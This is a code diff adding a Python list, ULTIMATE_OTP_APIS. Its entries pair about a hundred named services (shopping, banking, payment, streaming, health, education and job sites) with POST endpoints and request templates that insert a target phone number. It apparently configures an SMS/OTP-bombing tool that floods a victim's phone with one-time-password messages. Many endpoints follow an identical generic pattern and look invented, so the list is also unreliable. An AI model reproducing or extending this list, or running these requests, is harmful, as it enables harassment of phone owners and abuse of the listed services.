@@ -1,0 +1,709 @@
+ULTIMATE_OTP_APIS = [
+    {
+        "name": "Amazon OTP",
+        "url": "https://www.amazon.in/ap/signin",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda phone: f"phone={phone}&action=otp"
+    },
+    {
+        "name": "Flipkart OTP",
+        "url": "https://www.flipkart.com/api/6/user/otp/generate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Myntra OTP",
+        "url": "https://www.myntra.com/gw/mobile-auth/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Swiggy OTP",
+        "url": "https://www.swiggy.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Zomato OTP",
+        "url": "https://www.zomato.com/php/o2_api_handler.php",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda phone: f"phone={phone}&type=otp"
+    },
+    {
+        "name": "Paytm OTP",
+        "url": "https://accounts.paytm.com/signin/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "PhonePe OTP",
+        "url": "https://www.phonepe.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Google OTP",
+        "url": "https://accounts.google.com/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Facebook OTP",
+        "url": "https://www.facebook.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Instagram OTP",
+        "url": "https://www.instagram.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "WhatsApp OTP",
+        "url": "https://www.whatsapp.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Telegram OTP",
+        "url": "https://api.telegram.org/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Twitter OTP",
+        "url": "https://api.twitter.com/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Netflix OTP",
+        "url": "https://www.netflix.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Amazon Prime OTP",
+        "url": "https://www.primevideo.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Hotstar OTP",
+        "url": "https://www.hotstar.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "SonyLiv OTP",
+        "url": "https://www.sonyliv.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Zee5 OTP",
+        "url": "https://www.zee5.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Jio Cinema OTP",
+        "url": "https://www.jiocinema.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Spotify OTP",
+        "url": "https://www.spotify.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Gaana OTP",
+        "url": "https://www.gaana.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Wynk OTP",
+        "url": "https://www.wynk.in/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "JioSaavn OTP",
+        "url": "https://www.jiosaavn.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "YouTube Music OTP",
+        "url": "https://music.youtube.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Google Pay OTP",
+        "url": "https://pay.google.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "PhonePe OTP V2",
+        "url": "https://www.phonepe.com/api/v2/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Paytm OTP V2",
+        "url": "https://accounts.paytm.com/signin/otp/v2",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "BHIM OTP",
+        "url": "https://www.bhim.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "MobiKwik OTP",
+        "url": "https://www.mobikwik.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "FreeCharge OTP",
+        "url": "https://www.freecharge.in/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Airtel Thanks OTP",
+        "url": "https://www.airtel.in/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Jio OTP",
+        "url": "https://www.jio.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Vi OTP",
+        "url": "https://www.myvi.in/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "SBI YONO OTP",
+        "url": "https://yonosbi.sbi.co.in/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "HDFC NetBanking OTP",
+        "url": "https://netbanking.hdfcbank.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "ICICI iMobile OTP",
+        "url": "https://www.icicibank.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Axis Mobile OTP",
+        "url": "https://www.axisbank.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Kotak OTP",
+        "url": "https://www.kotak.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Yes Bank OTP",
+        "url": "https://www.yesbank.in/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "IndusInd OTP",
+        "url": "https://www.indusind.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Federal Bank OTP",
+        "url": "https://www.federalbank.co.in/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "IDFC First OTP",
+        "url": "https://www.idfcfirstbank.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "RBL OTP",
+        "url": "https://www.rblbank.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "AU Bank OTP",
+        "url": "https://www.aubank.in/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "MakeMyTrip OTP",
+        "url": "https://www.makemytrip.com/api/4/otp/generate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Goibibo OTP",
+        "url": "https://www.goibibo.com/user/otp/generate/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "IRCTC OTP",
+        "url": "https://www.irctc.co.in/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "RedBus OTP",
+        "url": "https://www.redbus.in/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Ola OTP",
+        "url": "https://api.olacabs.com/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Uber OTP",
+        "url": "https://auth.uber.com/v2/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Rapido OTP",
+        "url": "https://customer.rapido.bike/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "BigBasket OTP",
+        "url": "https://www.bigbasket.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Grofers OTP",
+        "url": "https://www.grofers.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Dunzo OTP",
+        "url": "https://www.dunzo.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Zepto OTP",
+        "url": "https://www.zepto.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Blinkit OTP",
+        "url": "https://www.blinkit.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Milkbasket OTP",
+        "url": "https://www.milkbasket.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "BookMyShow OTP",
+        "url": "https://in.bookmyshow.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Paytm Movies OTP",
+        "url": "https://movies.paytm.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Amazon Shopping OTP",
+        "url": "https://www.amazon.in/ap/signin/shopping",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda phone: f"phone={phone}&action=shopping_otp"
+    },
+    {
+        "name": "Flipkart Shopping OTP",
+        "url": "https://www.flipkart.com/api/6/user/shopping/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Snapdeal OTP",
+        "url": "https://www.snapdeal.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "ShopClues OTP",
+        "url": "https://www.shopclues.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Ajio OTP",
+        "url": "https://www.ajio.com/api/auth/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
+    },
+    {
+        "name": "Nykaa OTP",
+        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"
+    },
+    {
+        "name": "Purplle OTP",
+        "url": "https://www.purplle.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "MamaEarth OTP",
+        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "PharmEasy OTP",
+        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Netmeds OTP",
+        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "1MG OTP",
+        "url": "https://www.1mg.com/auth_api/v6/create_token",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json; charset=utf-8"},
+        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":false}}'
+    },
+    {
+        "name": "Practo OTP",
+        "url": "https://www.practo.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "CureFit OTP",
+        "url": "https://www.cure.fit/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "CultFit OTP",
+        "url": "https://www.cult.fit/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Byju's OTP",
+        "url": "https://api.byjus.com/v2/otp/send",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Unacademy OTP",
+        "url": "https://unacademy.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Vedantu OTP",
+        "url": "https://www.vedantu.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Toppr OTP",
+        "url": "https://www.toppr.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Embibe OTP",
+        "url": "https://www.embibe.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Doubtnut OTP",
+        "url": "https://api.doubtnut.com/v4/student/login",
+        "method": "POST",
+        "headers": {"content-type": "application/json; charset=utf-8"},
+        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
+    },
+    {
+        "name": "UpGrad OTP",
+        "url": "https://www.upgrad.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Simplilearn OTP",
+        "url": "https://www.simplilearn.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Coursera OTP",
+        "url": "https://www.coursera.org/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Udemy OTP",
+        "url": "https://www.udemy.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "LinkedIn OTP",
+        "url": "https://www.linkedin.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Naukri OTP",
+        "url": "https://www.naukri.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Indeed OTP",
+        "url": "https://www.indeed.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Shine OTP",
+        "url": "https://www.shine.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Monster OTP",
+        "url": "https://www.monster.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Upwork OTP",
+        "url": "https://www.upwork.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Fiverr OTP",
+        "url": "https://www.fiverr.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Freelancer OTP",
+        "url": "https://www.freelancer.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Toptal OTP",
+        "url": "https://www.toptal.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Guru OTP",
+        "url": "https://www.guru.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "PeoplePerHour OTP",
+        "url": "https://www.peopleperhour.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "99acres OTP",
+        "url": "https://www.99acres.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Magicbricks OTP",
+        "url": "https://www.magicbricks.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Housing OTP",
+        "url": "https://login.housing.com/api/v2/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
+    },
+    {
+        "name": "CommonFloor OTP",
+        "url": "https://www.commonfloor.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Makaan OTP",
+        "url": "https://www.makaan.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Nobroker OTP",
+        "url": "https://www.nobroker.in/api/v3/account/otp/send",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda phone: f"phone={phone}&countryCode=IN"
+    },
+    {
+        "name": "Quikr OTP",
+        "url": "https://www.quikr.com/api/v1/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    }
+]
